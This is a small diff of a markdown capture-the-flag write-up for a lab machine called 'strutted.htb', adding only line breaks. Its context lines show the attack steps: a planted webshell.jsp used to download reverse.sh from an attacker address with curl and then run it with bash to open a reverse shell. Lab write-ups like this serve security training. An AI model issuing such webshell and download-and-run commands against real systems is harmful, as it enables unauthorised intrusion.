@@ -280,6 +280,8 @@ Perfect!! We can `execute` commands as tomcat, let's gain `access` with a `Rever
 
 To do it, firt we create a `"reverse.sh"` file and put it in the `/tmp` path of the victim system with `curl`:
 
+<br />
+
 - `http://strutted.htb/webshell.jsp?action=cmd&cmd=curl%2010.10.14.22/reverse.sh%20-o%20/tmp/reverse.sh`
 
 <br />
@@ -293,6 +295,8 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 <br />
 
 Now we can `execute` the `script` with the following `command`:
+
+<br />
 
 - `http://strutted.htb/webshell.jsp?action=cmd&cmd=bash%20/tmp/reverse.sh`
 
